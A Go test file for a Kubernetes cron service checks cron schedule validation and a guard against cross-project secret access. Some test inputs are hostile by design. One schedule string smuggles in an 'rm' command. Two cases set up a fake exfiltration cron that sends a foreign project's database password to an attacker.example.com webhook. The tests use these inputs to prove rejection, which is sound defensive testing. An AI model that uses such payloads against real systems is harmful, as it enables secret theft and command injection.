package crons

import (
	"context"
	"errors"
	"strings"
	"testing"

	"kuso/server/internal/kube"
)

func TestValidateSchedule(t *testing.T) {
	cases := []struct {
		name    string
		in      string
		wantOK  bool
		wantSub string
	}{
		// Standard 5-field grammar — should all pass.
		{"every-15m", "*/15 * * * *", true, ""},
		{"midnight", "0 0 * * *", true, ""},
		{"weekday", "0 9 * * 1-5", true, ""},
		{"step-and-list", "*/5,30 * * * *", true, ""},
		{"explicit-range", "0 0-23 1-31 1-12 0-6", true, ""},

		// Empty.
		{"empty", "", false, "required"},
		{"whitespace-only", "   ", false, "required"},

		// Quartz `?` — pass-4 P1-6 flagged this as the "validator
		// lies" bug. kube CronJob rejects it; we should too, with a
		// clear error, before it ever reaches the apiserver.
		{"quartz-dom-q", "0 0 ? * *", false, "5-field"},
		{"quartz-dow-q", "0 0 1 * ?", false, "5-field"},

		// @-macro shorthand — different dialect, kube rejects.
		{"at-hourly", "@hourly", false, "macro"},
		{"at-daily", "@daily", false, "macro"},
		{"at-yearly", "@yearly", false, "macro"},

		// 6-field (Quartz/Vixie with seconds).
		{"6-field-seconds", "0 0 0 * * *", false, "5-field"},

		// 4-field — not a valid schedule.
		{"4-field", "0 0 * *", false, "5-field"},

		// Wrong char.
		{"alpha", "every minute", false, "5-field"},
		{"semicolon", "0 0 * * *;rm", false, "5-field"},

		// Out-of-range values that PASS the shape regex but kube CronJob
		// rejects at reconcile (the "validator lies" bug). Must be caught
		// inline via per-field range checks.
		{"hour-25", "0 25 * * *", false, "range"},
		{"good-3am", "0 3 * * *", true, ""},
		{"minute-60", "60 * * * *", false, "range"},
		{"dom-0", "0 0 0 * *", false, "range"},
		{"dom-32", "0 0 32 * *", false, "range"},
		{"month-13", "0 0 1 13 *", false, "range"},
		{"dow-7", "0 0 * * 7", false, "range"},
		{"range-endpoint-oob", "0 0-24 * * *", false, "range"},
		{"list-elem-oob", "0 1,25 * * *", false, "range"},
		{"zero-step", "*/0 * * * *", false, "range"},
	}
	for _, c := range cases {
		err := validateSchedule(c.in)
		gotOK := err == nil
		if gotOK != c.wantOK {
			t.Errorf("%s: validateSchedule(%q) ok=%v, want %v (err=%v)", c.name, c.in, gotOK, c.wantOK, err)
			continue
		}
		if !c.wantOK {
			if !errors.Is(err, ErrInvalid) {
				t.Errorf("%s: error should wrap ErrInvalid; got %v", c.name, err)
			}
			if c.wantSub != "" && !strings.Contains(err.Error(), c.wantSub) {
				t.Errorf("%s: error %q missing %q", c.name, err.Error(), c.wantSub)
			}
		}
	}
}

// TestValidateOnFailureSecretRef is the HIGH-1 regression guard: a
// cron's onFailure webhook signing-key secretRef must name a secret the
// cron's OWN project owns. Naming a foreign project's `<addon>-conn`
// (the exfiltration vector) must be rejected; naming the project's own
// addon-conn / project-shared / instance-shared secret is allowed.
func TestValidateOnFailureSecretRef(t *testing.T) {
	// AddonConnSecrets resolver stubbed to a fixed owned set — no kube
	// client needed, mirroring the fail-safe design of the projects
	// package validator. "myproj" owns myproj-pg-conn; "victim" owns
	// victim-pg-conn (which myproj must NOT be able to reference).
	s := &Service{
		AddonConnSecrets: func(_ context.Context, project string) ([]string, error) {
			switch project {
			case "myproj":
				return []string{"myproj-pg-conn", "myproj-redis-conn"}, nil
			case "victim":
				return []string{"victim-pg-conn"}, nil
			default:
				return nil, nil
			}
		},
	}
	cases := []struct {
		name    string
		project string
		ref     *kube.KusoSecretKeyRef
		wantOK  bool
		wantErr error // when !wantOK, the sentinel the error must wrap
	}{
		// Own project's secrets — all allowed.
		{"own-addon-conn", "myproj", &kube.KusoSecretKeyRef{Name: "myproj-pg-conn", Key: "url"}, true, nil},
		{"own-other-conn", "myproj", &kube.KusoSecretKeyRef{Name: "myproj-redis-conn", Key: "url"}, true, nil},
		{"own-project-shared", "myproj", &kube.KusoSecretKeyRef{Name: "myproj-shared", Key: "k"}, true, nil},
		{"instance-shared", "myproj", &kube.KusoSecretKeyRef{Name: "kuso-instance-shared", Key: "k"}, true, nil},
		{"nil-ref", "myproj", nil, true, nil},

		// The exfiltration vector: myproj naming victim's conn secret.
		{"foreign-conn", "myproj", &kube.KusoSecretKeyRef{Name: "victim-pg-conn", Key: "password"}, false, ErrConflict},
		// Foreign project-shared secret.
		{"foreign-shared", "myproj", &kube.KusoSecretKeyRef{Name: "victim-shared", Key: "k"}, false, ErrConflict},
		// Empty name.
		{"empty-name", "myproj", &kube.KusoSecretKeyRef{Name: "", Key: "k"}, false, ErrInvalid},
	}
	for _, c := range cases {
		err := s.validateOnFailureSecretRef(context.Background(), c.project, c.ref)
		gotOK := err == nil
		if gotOK != c.wantOK {
			t.Errorf("%s: validateOnFailureSecretRef ok=%v, want %v (err=%v)", c.name, gotOK, c.wantOK, err)
			continue
		}
		if !c.wantOK && !errors.Is(err, c.wantErr) {
			t.Errorf("%s: error should wrap %v; got %v", c.name, c.wantErr, err)
		}
	}
}

// TestAddProjectRejectsForeignSecretRef proves the guard is wired into
// the create write path: a foreign secretRef is rejected BEFORE any CR
// is written (the check short-circuits ahead of every kube call, so a
// nil Kube client here never gets dereferenced).
func TestAddProjectRejectsForeignSecretRef(t *testing.T) {
	s := &Service{
		Namespace: "kuso",
		AddonConnSecrets: func(_ context.Context, project string) ([]string, error) {
			if project == "victim" {
				return []string{"victim-pg-conn"}, nil
			}
			return nil, nil
		},
	}
	req := CreateProjectCronRequest{
		Name:     "leak",
		Kind:     "http",
		Schedule: "*/5 * * * *",
		URL:      "https://attacker.example.com/collect",
		OnFailure: &kube.KusoCronOnFailure{
			WebhookURL: "https://attacker.example.com/collect",
			SecretRef:  &kube.KusoSecretKeyRef{Name: "victim-pg-conn", Key: "password"},
		},
	}
	_, err := s.AddProject(context.Background(), "myproj", req)
	if err == nil {
		t.Fatal("AddProject accepted a foreign secretRef — cross-project exfiltration guard missing")
	}
	if !errors.Is(err, ErrConflict) {
		t.Errorf("error should wrap ErrConflict; got %v", err)
	}
	if !strings.Contains(err.Error(), "victim-pg-conn") {
		t.Errorf("error %q should name the rejected secret", err.Error())
	}
}

// TestUpdateProjectRejectsForeignSecretRef is the same guard on the
// update write path — the live vector described in HIGH-1. The check
// runs before UpdateKusoCronWithRetry, so a nil Kube client is never
// reached on the reject path.
func TestUpdateProjectRejectsForeignSecretRef(t *testing.T) {
	s := &Service{
		Namespace: "kuso",
		AddonConnSecrets: func(_ context.Context, project string) ([]string, error) {
			if project == "victim" {
				return []string{"victim-pg-conn"}, nil
			}
			return nil, nil
		},
	}
	req := UpdateProjectCronRequest{
		OnFailure: &OnFailureUpdate{
			WebhookURL: "https://attacker.example.com/collect",
			SecretRef:  &kube.KusoSecretKeyRef{Name: "victim-pg-conn", Key: "password"},
		},
	}
	_, err := s.UpdateProject(context.Background(), "myproj", "leak", req)
	if err == nil {
		t.Fatal("UpdateProject accepted a foreign secretRef — cross-project exfiltration guard missing")
	}
	if !errors.Is(err, ErrConflict) {
		t.Errorf("error should wrap ErrConflict; got %v", err)
	}
}
